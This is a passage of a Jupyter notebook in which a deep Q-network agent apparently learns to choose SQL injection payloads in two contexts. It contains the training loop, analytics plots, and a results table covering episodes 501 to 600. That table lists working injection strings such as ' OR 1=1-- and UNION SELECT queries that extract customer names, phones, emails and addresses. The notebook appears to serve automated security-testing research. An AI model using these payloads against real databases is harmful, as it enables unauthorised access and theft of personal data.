    "            analytics.record_success(action)\n",
    "\n",
    "        # Save actions and states in replay buffer\n",
    "        action_history.append(action)\n",
    "        state_history.append(state)\n",
    "        state_next_history.append(state_next)\n",
    "        done_history.append(done)\n",
    "        rewards_history.append(reward)\n",
    "        state = state_next\n",
    "\n",
    "        # Update every fourth frame and once batch size is over 32\n",
    "        if frame_count % update_after_actions == 0 and len(done_history) > batch_size:\n",
    "\n",
    "            # Get indices of samples for replay buffers\n",
    "            indices = np.random.choice(range(len(done_history)), size=batch_size)\n",
    "            #print(state_history[-2:-1])\n",
    "\n",
    "            # Using list comprehension to sample from replay buffer\n",
    "            state_sample = np.array([state_history[i] for i in indices]).reshape(batch_size, features, 1)\n",
    "            state_next_sample = np.array([state_next_history[i] for i in indices]).reshape(batch_size, features, 1)\n",
    "            rewards_sample = [rewards_history[i] for i in indices]\n",
    "            action_sample = [action_history[i] for i in indices]\n",
    "            done_sample = tf.convert_to_tensor(\n",
    "                [float(done_history[i]) for i in indices]\n",
    "            )\n",
    "\n",
    "            # Build the updated Q-values for the sampled future states\n",
    "            # Use the target model for stability\n",
    "            future_rewards = model_target.predict(state_next_sample, batch_size=batch_size, verbose=0)\n",
    "            # Q value = reward + discount factor * expected future reward\n",
    "            updated_q_values = rewards_sample + gamma * tf.reduce_max(\n",
    "                future_rewards, axis=1\n",
    "            )\n",
    "\n",
    "            # If final frame set the last value to -1\n",
    "            updated_q_values = updated_q_values * (1 - done_sample) - done_sample\n",
    "\n",
    "            # Create a mask so we only calculate loss on the updated Q-values\n",
    "            masks = tf.one_hot(action_sample, num_actions)\n",
    "\n",
    "            with tf.GradientTape() as tape:\n",
    "                # Train the model on the states and updated Q-values\n",
    "                q_values = model(state_sample)\n",
    "\n",
    "                # Apply the masks to the Q-values to get the Q-value for action taken\n",
    "                q_action = tf.reduce_sum(tf.multiply(q_values, masks), axis=1)\n",
    "                # Calculate loss between new Q-value and old Q-value\n",
    "                loss = loss_function(updated_q_values, q_action)\n",
    "\n",
    "            # Backpropagation\n",
    "            grads = tape.gradient(loss, model.trainable_variables)\n",
    "            optimizer.apply_gradients(zip(grads, model.trainable_variables))\n",
    "\n",
    "        if frame_count % update_target_network == 0:\n",
    "            # update the the target network with new weights\n",
    "            model_target.set_weights(model.get_weights())\n",
    "            # Log details\n",
    "            template = 'Running reward: {:.2f}\\t Episode {}\\t Frame count: {}\\t Context: {}'\n",
    "            print(template.format(running_reward, episode_count + 1, frame_count, context_index + 1))\n",
    "\n",
    "        # Limit the state and reward history\n",
    "        if len(rewards_history) > max_memory_length:\n",
    "            del rewards_history[:1]\n",
    "            del state_history[:1]\n",
    "            del state_next_history[:1]\n",
    "            del action_history[:1]\n",
    "            del done_history[:1]\n",
    "\n",
    "        if done:\n",
    "            break\n",
    "\n",
    "    # Update running reward to check condition for solving\n",
    "    episode_reward_history.append(episode_reward)\n",
    "    if len(episode_reward_history) > 100:\n",
    "        del episode_reward_history[:1]\n",
    "    running_reward = np.mean(episode_reward_history)\n",
    "\n",
    "    episode_count += 1\n",
    "\n",
    "    if episode_count >= training_episodes + test_episodes:\n",
    "        print(f'DQN terminated at episode {episode_count} with a running reward of {running_reward}!')\n",
    "        analytics.stop_analytics()\n",
    "        break"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 44,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "image/png": "[encoded data removed]",
      "text/plain": [
       "<Figure size 432x288 with 1 Axes>"
      ]
     },
     "metadata": {
      "needs_background": "light"
     },
     "output_type": "display_data"
    }
   ],
   "source": [
    "analytics.plot_avg_attempts()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 45,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "image/png": "[encoded data removed]",
      "text/plain": [
       "<Figure size 432x288 with 1 Axes>"
      ]
     },
     "metadata": {
      "needs_background": "light"
     },
     "output_type": "display_data"
    }
   ],
   "source": [
    "analytics.plot_context_attempts()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 46,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "image/png": "[encoded data removed]",
      "text/plain": [
       "<Figure size 432x288 with 1 Axes>"
      ]
     },
     "metadata": {
      "needs_background": "light"
     },
     "output_type": "display_data"
    }
   ],
   "source": [
    "analytics.plot_avg_timings()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 47,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "image/png": "[encoded data removed]",
      "text/plain": [
       "<Figure size 432x288 with 1 Axes>"
      ]
     },
     "metadata": {
      "needs_background": "light"
     },
     "output_type": "display_data"
    }
   ],
   "source": [
    "analytics.plot_context_timings()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 48,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "',Context 1,Context 2\\r\\nEpisode 501,\\' OR 1=1-- ,\"\\' UNION SELECT customer_id, first_name, last_name, phone, email, street, city, state, zip_code FROM sales.customers--\"\\r\\nEpisode 502,\"\\' UNION SELECT product_id, product_name, brand_id, category_id, model_year, list_price FROM production.products--\",\\' OR 1=1-- \\r\\nEpisode 503,\"\\' UNION SELECT product_id, product_name, brand_id, category_id, model_year, list_price FROM production.products--\",\\' OR 1=1-- \\r\\nEpisode 504,\\' OR 1=1-- ,\"\\' UNION SELECT customer_id, first_name, last_name, phone, email, street, city, state, zip_code FROM sales.customers--\"\\r\\nEpisode 505,\\' OR 1=1-- ,\"\\' UNION SELECT customer_id, first_name, last_name, phone, email, street, city, state, zip_code FROM sales.customers--\"\\r\\nEpisode 506,\"\\' UNION SELECT product_id, product_name, brand_id, category_id, model_year, list_price FROM production.products--\",\"\\' UNION SELECT customer_id, first_name, last_name, phone, email, street, city, state, zip_code FROM sales.customers--\"\\r\\nEpisode 507,\"\\' UNION SELECT product_id, product_name, brand_id, category_id, model_year, list_price FROM production.products--\",\"\\' UNION SELECT customer_id, first_name, last_name, phone, email, street, city, state, zip_code FROM sales.customers--\"\\r\\nEpisode 508,\"\\' UNION SELECT product_id, product_name, brand_id, category_id, model_year, list_price FROM production.products--\",\\' OR 1=1-- \\r\\nEpisode 509,\"\\' UNION SELECT product_id, product_name, brand_id, category_id, model_year, list_price FROM production.products--\",\\' OR 1=1-- \\r\\nEpisode 510,\"\\' UNION SELECT product_id, product_name, brand_id, category_id, model_year, list_price FROM production.products--\",\"\\' UNION SELECT customer_id, first_name, last_name, phone, email, street, city, state, zip_code FROM sales.customers--\"\\r\\nEpisode 511,\\' OR 1=1-- ,\"\\' UNION SELECT customer_id, first_name, last_name, phone, email, street, city, state, zip_code FROM sales.customers--\"\\r\\nEpisode 512,\\' OR 1=1-- ,\\' OR 1=1-- \\r\\nEpisode 513,\\' OR 1=1-- ,\\' OR 1=1-- \\r\\nEpisode 514,\"\\' UNION SELECT product_id, product_name, brand_id, category_id, model_year, list_price FROM production.products--\",\\' OR 1=1-- \\r\\nEpisode 515,\\' OR 1=1-- ,\\' OR 1=1-- \\r\\nEpisode 516,\\' OR 1=1-- ,\"\\' UNION SELECT customer_id, first_name, last_name, phone, email, street, city, state, zip_code FROM sales.customers--\"\\r\\nEpisode 517,\\' OR 1=1-- ,\"\\' UNION SELECT customer_id, first_name, last_name, phone, email, street, city, state, zip_code FROM sales.customers--\"\\r\\nEpisode 518,\"\\' UNION SELECT product_id, product_name, brand_id, category_id, model_year, list_price FROM production.products--\",\\' OR 1=1-- \\r\\nEpisode 519,\\' OR 1=1-- ,\"\\' UNION SELECT customer_id, first_name, last_name, phone, email, street, city, state, zip_code FROM sales.customers--\"\\r\\nEpisode 520,\"\\' UNION SELECT product_id, product_name, brand_id, category_id, model_year, list_price FROM production.products--\",\\' OR 1=1-- \\r\\nEpisode 521,\"\\' UNION SELECT product_id, product_name, brand_id, category_id, model_year, list_price FROM production.products--\",\\' OR 1=1-- \\r\\nEpisode 522,\"\\' UNION SELECT product_id, product_name, brand_id, category_id, model_year, list_price FROM production.products--\",\\' OR 1=1-- \\r\\nEpisode 523,\\' OR 1=1-- ,\"\\' UNION SELECT customer_id, first_name, last_name, phone, email, street, city, state, zip_code FROM sales.customers--\"\\r\\nEpisode 524,\"\\' UNION SELECT product_id, product_name, brand_id, category_id, model_year, list_price FROM production.products--\",\\' OR 1=1-- \\r\\nEpisode 525,\"\\' UNION SELECT product_id, product_name, brand_id, category_id, model_year, list_price FROM production.products--\",\"\\' UNION SELECT customer_id, first_name, last_name, phone, email, street, city, state, zip_code FROM sales.customers--\"\\r\\nEpisode 526,\"\\' UNION SELECT product_id, product_name, brand_id, category_id, model_year, list_price FROM production.products--\",\\' OR 1=1-- \\r\\nEpisode 527,\"\\' UNION SELECT product_id, product_name, brand_id, category_id, model_year, list_price FROM production.products--\",\"\\' UNION SELECT customer_id, first_name, last_name, phone, email, street, city, state, zip_code FROM sales.customers--\"\\r\\nEpisode 528,\\' OR 1=1-- ,\"\\' UNION SELECT customer_id, first_name, last_name, phone, email, street, city, state, zip_code FROM sales.customers--\"\\r\\nEpisode 529,\"\\' UNION SELECT product_id, product_name, brand_id, category_id, model_year, list_price FROM production.products--\",\"\\' UNION SELECT customer_id, first_name, last_name, phone, email, street, city, state, zip_code FROM sales.customers--\"\\r\\nEpisode 530,\\' OR 1=1-- ,\\' OR 1=1-- \\r\\nEpisode 531,\"\\' UNION SELECT product_id, product_name, brand_id, category_id, model_year, list_price FROM production.products--\",\"\\' UNION SELECT customer_id, first_name, last_name, phone, email, street, city, state, zip_code FROM sales.customers--\"\\r\\nEpisode 532,\"\\' UNION SELECT product_id, product_name, brand_id, category_id, model_year, list_price FROM production.products--\",\\' OR 1=1-- \\r\\nEpisode 533,\\' OR 1=1-- ,\\' OR 1=1-- \\r\\nEpisode 534,\"\\' UNION SELECT product_id, product_name, brand_id, category_id, model_year, list_price FROM production.products--\",\"\\' UNION SELECT customer_id, first_name, last_name, phone, email, street, city, state, zip_code FROM sales.customers--\"\\r\\nEpisode 535,\\' OR 1=1-- ,\"\\' UNION SELECT customer_id, first_name, last_name, phone, email, street, city, state, zip_code FROM sales.customers--\"\\r\\nEpisode 536,\"\\' UNION SELECT product_id, product_name, brand_id, category_id, model_year, list_price FROM production.products--\",\"\\' UNION SELECT customer_id, first_name, last_name, phone, email, street, city, state, zip_code FROM sales.customers--\"\\r\\nEpisode 537,\"\\' UNION SELECT product_id, product_name, brand_id, category_id, model_year, list_price FROM production.products--\",\"\\' UNION SELECT customer_id, first_name, last_name, phone, email, street, city, state, zip_code FROM sales.customers--\"\\r\\nEpisode 538,\"\\' UNION SELECT product_id, product_name, brand_id, category_id, model_year, list_price FROM production.products--\",\\' OR 1=1-- \\r\\nEpisode 539,\\' OR 1=1-- ,\"\\' UNION SELECT customer_id, first_name, last_name, phone, email, street, city, state, zip_code FROM sales.customers--\"\\r\\nEpisode 540,\"\\' UNION SELECT product_id, product_name, brand_id, category_id, model_year, list_price FROM production.products--\",\\' OR 1=1-- \\r\\nEpisode 541,\"\\' UNION SELECT product_id, product_name, brand_id, category_id, model_year, list_price FROM production.products--\",\"\\' UNION SELECT customer_id, first_name, last_name, phone, email, street, city, state, zip_code FROM sales.customers--\"\\r\\nEpisode 542,\"\\' UNION SELECT product_id, product_name, brand_id, category_id, model_year, list_price FROM production.products--\",\\' OR 1=1-- \\r\\nEpisode 543,\\' OR 1=1-- ,\\' OR 1=1-- \\r\\nEpisode 544,\"\\' UNION SELECT product_id, product_name, brand_id, category_id, model_year, list_price FROM production.products--\",\"\\' UNION SELECT customer_id, first_name, last_name, phone, email, street, city, state, zip_code FROM sales.customers--\"\\r\\nEpisode 545,\\' OR 1=1-- ,\\' OR 1=1-- \\r\\nEpisode 546,\"\\' UNION SELECT product_id, product_name, brand_id, category_id, model_year, list_price FROM production.products--\",\\' OR 1=1-- \\r\\nEpisode 547,\\' OR 1=1-- ,\\' OR 1=1-- \\r\\nEpisode 548,\"\\' UNION SELECT product_id, product_name, brand_id, category_id, model_year, list_price FROM production.products--\",\"\\' UNION SELECT customer_id, first_name, last_name, phone, email, street, city, state, zip_code FROM sales.customers--\"\\r\\nEpisode 549,\\' OR 1=1-- ,\"\\' UNION SELECT customer_id, first_name, last_name, phone, email, street, city, state, zip_code FROM sales.customers--\"\\r\\nEpisode 550,\\' OR 1=1-- ,\\' OR 1=1-- \\r\\nEpisode 551,\\' OR 1=1-- ,\"\\' UNION SELECT customer_id, first_name, last_name, phone, email, street, city, state, zip_code FROM sales.customers--\"\\r\\nEpisode 552,\"\\' UNION SELECT product_id, product_name, brand_id, category_id, model_year, list_price FROM production.products--\",\"\\' UNION SELECT customer_id, first_name, last_name, phone, email, street, city, state, zip_code FROM sales.customers--\"\\r\\nEpisode 553,\"\\' UNION SELECT product_id, product_name, brand_id, category_id, model_year, list_price FROM production.products--\",\"\\' UNION SELECT customer_id, first_name, last_name, phone, email, street, city, state, zip_code FROM sales.customers--\"\\r\\nEpisode 554,\"\\' UNION SELECT product_id, product_name, brand_id, category_id, model_year, list_price FROM production.products--\",\\' OR 1=1-- \\r\\nEpisode 555,\"\\' UNION SELECT product_id, product_name, brand_id, category_id, model_year, list_price FROM production.products--\",\"\\' UNION SELECT customer_id, first_name, last_name, phone, email, street, city, state, zip_code FROM sales.customers--\"\\r\\nEpisode 556,\\' OR 1=1-- ,\\' OR 1=1-- \\r\\nEpisode 557,\"\\' UNION SELECT product_id, product_name, brand_id, category_id, model_year, list_price FROM production.products--\",\"\\' UNION SELECT customer_id, first_name, last_name, phone, email, street, city, state, zip_code FROM sales.customers--\"\\r\\nEpisode 558,\"\\' UNION SELECT product_id, product_name, brand_id, category_id, model_year, list_price FROM production.products--\",\\' OR 1=1-- \\r\\nEpisode 559,\\' OR 1=1-- ,\\' OR 1=1-- \\r\\nEpisode 560,\\' OR 1=1-- ,\\' OR 1=1-- \\r\\nEpisode 561,\\' OR 1=1-- ,\\' OR 1=1-- \\r\\nEpisode 562,\"\\' UNION SELECT product_id, product_name, brand_id, category_id, model_year, list_price FROM production.products--\",\\' OR 1=1-- \\r\\nEpisode 563,\\' OR 1=1-- ,\"\\' UNION SELECT customer_id, first_name, last_name, phone, email, street, city, state, zip_code FROM sales.customers--\"\\r\\nEpisode 564,\"\\' UNION SELECT product_id, product_name, brand_id, category_id, model_year, list_price FROM production.products--\",\\' OR 1=1-- \\r\\nEpisode 565,\"\\' UNION SELECT product_id, product_name, brand_id, category_id, model_year, list_price FROM production.products--\",\"\\' UNION SELECT customer_id, first_name, last_name, phone, email, street, city, state, zip_code FROM sales.customers--\"\\r\\nEpisode 566,\\' OR 1=1-- ,\"\\' UNION SELECT customer_id, first_name, last_name, phone, email, street, city, state, zip_code FROM sales.customers--\"\\r\\nEpisode 567,\\' OR 1=1-- ,\\' OR 1=1-- \\r\\nEpisode 568,\\' OR 1=1-- ,\"\\' UNION SELECT customer_id, first_name, last_name, phone, email, street, city, state, zip_code FROM sales.customers--\"\\r\\nEpisode 569,\\' OR 1=1-- ,\"\\' UNION SELECT customer_id, first_name, last_name, phone, email, street, city, state, zip_code FROM sales.customers--\"\\r\\nEpisode 570,\\' OR 1=1-- ,\\' OR 1=1-- \\r\\nEpisode 571,\\' OR 1=1-- ,\\' OR 1=1-- \\r\\nEpisode 572,\\' OR 1=1-- ,\"\\' UNION SELECT customer_id, first_name, last_name, phone, email, street, city, state, zip_code FROM sales.customers--\"\\r\\nEpisode 573,\"\\' UNION SELECT product_id, product_name, brand_id, category_id, model_year, list_price FROM production.products--\",\"\\' UNION SELECT customer_id, first_name, last_name, phone, email, street, city, state, zip_code FROM sales.customers--\"\\r\\nEpisode 574,\\' OR 1=1-- ,\\' OR 1=1-- \\r\\nEpisode 575,\\' OR 1=1-- ,\\' OR 1=1-- \\r\\nEpisode 576,\\' OR 1=1-- ,\"\\' UNION SELECT customer_id, first_name, last_name, phone, email, street, city, state, zip_code FROM sales.customers--\"\\r\\nEpisode 577,\"\\' UNION SELECT product_id, product_name, brand_id, category_id, model_year, list_price FROM production.products--\",\\' OR 1=1-- \\r\\nEpisode 578,\"\\' UNION SELECT product_id, product_name, brand_id, category_id, model_year, list_price FROM production.products--\",\\' OR 1=1-- \\r\\nEpisode 579,\"\\' UNION SELECT product_id, product_name, brand_id, category_id, model_year, list_price FROM production.products--\",\\' OR 1=1-- \\r\\nEpisode 580,\\' OR 1=1-- ,\\' OR 1=1-- \\r\\nEpisode 581,\\' OR 1=1-- ,\\' OR 1=1-- \\r\\nEpisode 582,\"\\' UNION SELECT product_id, product_name, brand_id, category_id, model_year, list_price FROM production.products--\",\\' OR 1=1-- \\r\\nEpisode 583,\\' OR 1=1-- ,\\' OR 1=1-- \\r\\nEpisode 584,\\' OR 1=1-- ,\\' OR 1=1-- \\r\\nEpisode 585,\"\\' UNION SELECT product_id, product_name, brand_id, category_id, model_year, list_price FROM production.products--\",\"\\' UNION SELECT customer_id, first_name, last_name, phone, email, street, city, state, zip_code FROM sales.customers--\"\\r\\nEpisode 586,\\' OR 1=1-- ,\\' OR 1=1-- \\r\\nEpisode 587,\\' OR 1=1-- ,\"\\' UNION SELECT customer_id, first_name, last_name, phone, email, street, city, state, zip_code FROM sales.customers--\"\\r\\nEpisode 588,\\' OR 1=1-- ,\\' OR 1=1-- \\r\\nEpisode 589,\\' OR 1=1-- ,\\' OR 1=1-- \\r\\nEpisode 590,\"\\' UNION SELECT product_id, product_name, brand_id, category_id, model_year, list_price FROM production.products--\",\"\\' UNION SELECT customer_id, first_name, last_name, phone, email, street, city, state, zip_code FROM sales.customers--\"\\r\\nEpisode 591,\\' OR 1=1-- ,\\' OR 1=1-- \\r\\nEpisode 592,\\' OR 1=1-- ,\\' OR 1=1-- \\r\\nEpisode 593,\"\\' UNION SELECT product_id, product_name, brand_id, category_id, model_year, list_price FROM production.products--\",\"\\' UNION SELECT customer_id, first_name, last_name, phone, email, street, city, state, zip_code FROM sales.customers--\"\\r\\nEpisode 594,\\' OR 1=1-- ,\"\\' UNION SELECT customer_id, first_name, last_name, phone, email, street, city, state, zip_code FROM sales.customers--\"\\r\\nEpisode 595,\"\\' UNION SELECT product_id, product_name, brand_id, category_id, model_year, list_price FROM production.products--\",\"\\' UNION SELECT customer_id, first_name, last_name, phone, email, street, city, state, zip_code FROM sales.customers--\"\\r\\nEpisode 596,\\' OR 1=1-- ,\\' OR 1=1-- \\r\\nEpisode 597,\\' OR 1=1-- ,\"\\' UNION SELECT customer_id, first_name, last_name, phone, email, street, city, state, zip_code FROM sales.customers--\"\\r\\nEpisode 598,\\' OR 1=1-- ,\\' OR 1=1-- \\r\\nEpisode 599,\"\\' UNION SELECT product_id, product_name, brand_id, category_id, model_year, list_price FROM production.products--\",\\' OR 1=1-- \\r\\nEpisode 600,\"\\' UNION SELECT product_id, product_name, brand_id, category_id, model_year, list_price FROM production.products--\",\\' OR 1=1-- \\r\\n'"
      ]
     },
     "execution_count": 48,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "df = analytics.get_test_payloads()\n",
    "df.to_csv()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 52,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>Context 1</th>\n",
       "      <th>Context 2</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>Episode 501</th>\n",
       "      <td>' OR 1=1--</td>\n",
       "      <td>' UNION SELECT customer_id, first_name, last_n...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Episode 502</th>\n",
       "      <td>' UNION SELECT product_id, product_name, brand...</td>\n",
       "      <td>' OR 1=1--</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Episode 503</th>\n",
       "      <td>' UNION SELECT product_id, product_name, brand...</td>\n",
       "      <td>' OR 1=1--</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Episode 504</th>\n",
       "      <td>' OR 1=1--</td>\n",
       "      <td>' UNION SELECT customer_id, first_name, last_n...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Episode 505</th>\n",
       "      <td>' OR 1=1--</td>\n",
       "      <td>' UNION SELECT customer_id, first_name, last_n...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Episode 506</th>\n",
       "      <td>' UNION SELECT product_id, product_name, brand...</td>\n",
       "      <td>' UNION SELECT customer_id, first_name, last_n...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Episode 507</th>\n",
       "      <td>' UNION SELECT product_id, product_name, brand...</td>\n",
       "      <td>' UNION SELECT customer_id, first_name, last_n...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Episode 508</th>\n",
       "      <td>' UNION SELECT product_id, product_name, brand...</td>\n",
       "      <td>' OR 1=1--</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Episode 509</th>\n",
       "      <td>' UNION SELECT product_id, product_name, brand...</td>\n",
       "      <td>' OR 1=1--</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Episode 510</th>\n",
       "      <td>' UNION SELECT product_id, product_name, brand...</td>\n",
       "      <td>' UNION SELECT customer_id, first_name, last_n...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Episode 511</th>\n",
       "      <td>' OR 1=1--</td>\n",
       "      <td>' UNION SELECT customer_id, first_name, last_n...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Episode 512</th>\n",
       "      <td>' OR 1=1--</td>\n",
       "      <td>' OR 1=1--</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Episode 513</th>\n",
       "      <td>' OR 1=1--</td>\n",
       "      <td>' OR 1=1--</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Episode 514</th>\n",
       "      <td>' UNION SELECT product_id, product_name, brand...</td>\n",
       "      <td>' OR 1=1--</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Episode 515</th>\n",
       "      <td>' OR 1=1--</td>\n",
       "      <td>' OR 1=1--</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Episode 516</th>\n",
       "      <td>' OR 1=1--</td>\n",
       "      <td>' UNION SELECT customer_id, first_name, last_n...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Episode 517</th>\n",
       "      <td>' OR 1=1--</td>\n",
       "      <td>' UNION SELECT customer_id, first_name, last_n...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Episode 518</th>\n",
       "      <td>' UNION SELECT product_id, product_name, brand...</td>\n",
       "      <td>' OR 1=1--</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Episode 519</th>\n",
       "      <td>' OR 1=1--</td>\n",
       "      <td>' UNION SELECT customer_id, first_name, last_n...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Episode 520</th>\n",
       "      <td>' UNION SELECT product_id, product_name, brand...</td>\n",
       "      <td>' OR 1=1--</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Episode 521</th>\n",
       "      <td>' UNION SELECT product_id, product_name, brand...</td>\n",
       "      <td>' OR 1=1--</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Episode 522</th>\n",
       "      <td>' UNION SELECT product_id, product_name, brand...</td>\n",
       "      <td>' OR 1=1--</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Episode 523</th>\n",
       "      <td>' OR 1=1--</td>\n",
       "      <td>' UNION SELECT customer_id, first_name, last_n...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Episode 524</th>\n",
       "      <td>' UNION SELECT product_id, product_name, brand...</td>\n",
       "      <td>' OR 1=1--</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Episode 525</th>\n",
       "      <td>' UNION SELECT product_id, product_name, brand...</td>\n",
       "      <td>' UNION SELECT customer_id, first_name, last_n...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Episode 526</th>\n",
       "      <td>' UNION SELECT product_id, product_name, brand...</td>\n",
       "      <td>' OR 1=1--</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Episode 527</th>\n",
       "      <td>' UNION SELECT product_id, product_name, brand...</td>\n",
       "      <td>' UNION SELECT customer_id, first_name, last_n...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Episode 528</th>\n",
       "      <td>' OR 1=1--</td>\n",
       "      <td>' UNION SELECT customer_id, first_name, last_n...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Episode 529</th>\n",
       "      <td>' UNION SELECT product_id, product_name, brand...</td>\n",
       "      <td>' UNION SELECT customer_id, first_name, last_n...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Episode 530</th>\n",
       "      <td>' OR 1=1--</td>\n",
       "      <td>' OR 1=1--</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Episode 531</th>\n",
       "      <td>' UNION SELECT product_id, product_name, brand...</td>\n",
       "      <td>' UNION SELECT customer_id, first_name, last_n...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Episode 532</th>\n",
       "      <td>' UNION SELECT product_id, product_name, brand...</td>\n",
       "      <td>' OR 1=1--</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Episode 533</th>\n",
       "      <td>' OR 1=1--</td>\n",
       "      <td>' OR 1=1--</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Episode 534</th>\n",
       "      <td>' UNION SELECT product_id, product_name, brand...</td>\n",
       "      <td>' UNION SELECT customer_id, first_name, last_n...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Episode 535</th>\n",
       "      <td>' OR 1=1--</td>\n",
       "      <td>' UNION SELECT customer_id, first_name, last_n...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Episode 536</th>\n",
       "      <td>' UNION SELECT product_id, product_name, brand...</td>\n",
       "      <td>' UNION SELECT customer_id, first_name, last_n...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Episode 537</th>\n",
       "      <td>' UNION SELECT product_id, product_name, brand...</td>\n",
       "      <td>' UNION SELECT customer_id, first_name, last_n...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Episode 538</th>\n",
       "      <td>' UNION SELECT product_id, product_name, brand...</td>\n",
       "      <td>' OR 1=1--</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Episode 539</th>\n",
       "      <td>' OR 1=1--</td>\n",
       "      <td>' UNION SELECT customer_id, first_name, last_n...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Episode 540</th>\n",
       "      <td>' UNION SELECT product_id, product_name, brand...</td>\n",
       "      <td>' OR 1=1--</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Episode 541</th>\n",
       "      <td>' UNION SELECT product_id, product_name, brand...</td>\n",
       "      <td>' UNION SELECT customer_id, first_name, last_n...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Episode 542</th>\n",
       "      <td>' UNION SELECT product_id, product_name, brand...</td>\n",
       "      <td>' OR 1=1--</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Episode 543</th>\n",
       "      <td>' OR 1=1--</td>\n",
       "      <td>' OR 1=1--</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Episode 544</th>\n",
       "      <td>' UNION SELECT product_id, product_name, brand...</td>\n",
       "      <td>' UNION SELECT customer_id, first_name, last_n...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Episode 545</th>\n",
       "      <td>' OR 1=1--</td>\n",
       "      <td>' OR 1=1--</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Episode 546</th>\n",
       "      <td>' UNION SELECT product_id, product_name, brand...</td>\n",
       "      <td>' OR 1=1--</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Episode 547</th>\n",
       "      <td>' OR 1=1--</td>\n",
       "      <td>' OR 1=1--</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Episode 548</th>\n",
       "      <td>' UNION SELECT product_id, product_name, brand...</td>\n",
       "      <td>' UNION SELECT customer_id, first_name, last_n...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Episode 549</th>\n",
       "      <td>' OR 1=1--</td>\n",
       "      <td>' UNION SELECT customer_id, first_name, last_n...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Episode 550</th>\n",
       "      <td>' OR 1=1--</td>\n",
       "      <td>' OR 1=1--</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Episode 551</th>\n",
       "      <td>' OR 1=1--</td>\n",
       "      <td>' UNION SELECT customer_id, first_name, last_n...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Episode 552</th>\n",
       "      <td>' UNION SELECT product_id, product_name, brand...</td>\n",
       "      <td>' UNION SELECT customer_id, first_name, last_n...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Episode 553</th>\n",
       "      <td>' UNION SELECT product_id, product_name, brand...</td>\n",
       "      <td>' UNION SELECT customer_id, first_name, last_n...</td>\n",
